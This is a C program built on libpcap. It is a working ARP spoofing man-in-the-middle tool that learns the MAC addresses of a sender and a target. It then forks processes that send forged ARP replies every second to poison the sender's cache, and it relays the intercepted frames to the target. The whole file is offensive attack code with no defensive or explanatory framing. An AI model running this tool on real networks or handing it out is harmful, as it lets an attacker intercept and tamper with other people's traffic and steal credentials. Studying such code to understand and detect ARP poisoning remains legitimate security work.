#include <pcap.h>
#include <stdio.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/if_ether.h>
#include <net/ethernet.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap/pcap.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <netinet/in.h>
#include <net/if.h>

int main(int argc, char *argv[]) {

	u_char fake_packet[42];
	u_char arp_req[42];
	const u_char *arp_rep;
	const u_char *sniff;
	u_char *spoof;
	char errbuf[PCAP_ERRBUF_SIZE];
	char *dev, *sip, *tip, mip[20], mac[6];
	u_char sendmac[6], targetmac[6];
	struct ether_header *ethh;
	struct ether_arp *arph;
	struct ip *iph;
	struct in_addr sipn, tipn, ipn;
	struct pcap_pkthdr *header;
	struct sockaddr_in *sin;
	struct ifreq ifr;
	pcap_t *handle;
	u_char mipn[4];
	int i, j, s, nextck, pid, pid2;

	if (!(argc >= 4 && argc % 2 == 0)) {
		printf("Usage Fail\n");
		return -1;
	}
	dev = argv[1];

	/* My Macaddress and IP*///////////////////////////////////////////////
	s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) perror("socket fail");
	strncpy(ifr.ifr_name, (const char *)dev, IFNAMSIZ);
	if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0)
		perror("ioctl fail");
	memcpy(mac, ifr.ifr_hwaddr.sa_data, 6);
	if (ioctl(s, SIOCGIFADDR, &ifr) < 0)
		perror("ioctl fail");
	sin = (struct sockaddr_in *)&ifr.ifr_addr;
	memcpy(mipn, (void *)&sin->sin_addr, sizeof(sin->sin_addr));
	sprintf(mip, "%d.%d.%d.%d", (int)mipn[0], (int)mipn[1], (int)mipn[2], (int)mipn[3]);
	inet_aton(mip, &ipn);
	close(s);

	for (i = 2; i < argc - 1; i += 2) {
		sip = argv[i];
		tip = argv[i + 1];
		inet_aton(sip, &sipn);
		inet_aton(tip, &tipn);

		pid = fork();
		if (pid < 0) {
			printf("fork fail\n");
			return -1;
		}
		else if (pid == 0) {
			/*Sendmac Plz*//////////////////////////////////////////////////
			bzero(arp_req, sizeof(arp_req));
			ethh = (struct ether_header *)arp_req;
			arph = (struct ether_arp *)(arp_req + 14);
			memset(ethh->ether_dhost, 0xff, 6);
			memcpy(ethh->ether_shost, mac, 6);
			ethh->ether_type = htons(ETH_P_ARP);
			arph->ea_hdr.ar_hrd = htons(0x0001);
			arph->ea_hdr.ar_pro = htons(ETH_P_IP);
			arph->ea_hdr.ar_hln = 0x06;
			arph->ea_hdr.ar_pln = 0x04;
			arph->ea_hdr.ar_op = htons(0x0001);
			memcpy(arph->arp_sha, mac, 6);
			memcpy(arph->arp_spa, &ipn.s_addr, 4);
			memset(arph->arp_tha, 0x00, 6);
			memcpy(arph->arp_tpa, &sipn.s_addr, 4);
			handle = pcap_open_live(dev, BUFSIZ, 0, 1000, errbuf);
			if (handle == NULL) {
				fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
				return(2);
			}
			while (1) {
				pcap_sendpacket(handle, arp_req, 42);
				nextck = pcap_next_ex(handle, &header, &arp_rep);
				if (nextck == 0) continue;
				else if (nextck == -1 || nextck == -2) {
					printf("pcap fail\n");
					return -1;
				}
				ethh = (struct ether_header *)arp_rep;
				arph = (struct ether_arp *)arp_rep + 14;
				if (ntohs(ethh->ether_type) == ETHERTYPE_ARP &&
					memcmp(arp_rep+28, &sipn.s_addr,4)==0) {
					for (j = 0; j < 6; j++)sendmac[j] = arp_rep[j + 6];
					break;
				}

			}

			/*Tagetmac Plz*/////////////////////////////////////////////////////////////
			bzero(arp_req, sizeof(arp_req));
			ethh = (struct ether_header *)arp_req;
			arph = (struct ether_arp *)(arp_req + 14);
			memset(ethh->ether_dhost, 0xff, 6);
			memcpy(ethh->ether_shost, mac, 6);
			ethh->ether_type = htons(ETH_P_ARP);
			arph->ea_hdr.ar_hrd = htons(0x0001);
			arph->ea_hdr.ar_pro = htons(ETH_P_IP);
			arph->ea_hdr.ar_hln = 0x06;
			arph->ea_hdr.ar_pln = 0x04;
			arph->ea_hdr.ar_op = htons(0x0001);
			memcpy(arph->arp_sha, mac, 6);
			memcpy(arph->arp_spa, &ipn.s_addr, 4);
			memset(arph->arp_tha, 0x00, 6);
			memcpy(arph->arp_tpa, &tipn.s_addr, 4);

			while (1) {
				pcap_sendpacket(handle, arp_req, 42);
				nextck = pcap_next_ex(handle, &header, &arp_rep);
				if (nextck == 0) continue;
				else if (nextck == -1 || nextck == -2) {
					printf("pcap fail\n");
					return -1;
				}
				ethh = (struct ether_header *)arp_rep;
				arph = (struct ether_arp *)arp_rep + 14;
				if (ntohs(ethh->ether_type) == ETHERTYPE_ARP  &&
					memcmp(arp_rep+28, &tipn.s_addr, 4) == 0	) {
					for (j = 0; j < 6; j++)targetmac[j] = arp_rep[j + 6];
					break;
				}

			}

			/*fake_packet making*/////////////////////////////////////////////////
			bzero(fake_packet, sizeof(fake_packet));
			ethh = (struct ether_header *)fake_packet;
			arph = (struct ether_arp *)(fake_packet + 14);
			memcpy(ethh->ether_dhost, sendmac, 6);
			memcpy(ethh->ether_shost, mac, 6);
			ethh->ether_type = htons(ETH_P_ARP);
			arph->ea_hdr.ar_hrd = htons(0x0001);
			arph->ea_hdr.ar_pro = htons(ETH_P_IP);
			arph->ea_hdr.ar_hln = 0x06;
			arph->ea_hdr.ar_pln = 0x04;
			arph->ea_hdr.ar_op = htons(0x0002);
			memcpy(arph->arp_sha, mac, 6);
			memcpy(arph->arp_spa, &tipn.s_addr, 4);
			memcpy(arph->arp_tha, sendmac, 6);
			memcpy(arph->arp_tpa, &sipn.s_addr, 4);


			printf("\nARP SPOOFING...[%d]", i / 2);
			printf("  %s -> %s\n", argv[i], argv[i + 1]);
			/*ARP Spoofing*/////////////////////////////////////////////////
			pid2 = fork();
			if (pid2 < 0) {
				printf("fork2 fail\n");
				return -1;
			}
			else if (pid2 == 0) {	/*ARP_Send*//////////////////////////////////////
				while (1) {
					pcap_sendpacket(handle, fake_packet, 42);
					sleep(1);
				}
			}
			else {			/*Packet_Sniffing*/////////////////////////////////////////
				while (1) {
					nextck = pcap_next_ex(handle, &header, &sniff);
					if (nextck == 0) continue;
					else if (nextck == -1 || nextck == -2) {
						printf("pcap fail\n");
						return -1;
					}
					if (memcmp(sniff,mac, 6) == 0 &&
						memcmp(sniff+6,sendmac,6)==0) {
						spoof = (u_char *)malloc(header->len);
						memcpy(spoof, sniff, header->len);
						for (j = 0; j < 6; j++)spoof[j] = targetmac[j];
						for (j = 0; j < 6; j++)spoof[j+6] = mac[j];
						pcap_sendpacket(handle, spoof, header->len);
						free(spoof);
					}
				}

			}
			pcap_close(handle);
			return 0;
		}
	}

	return 0;
}
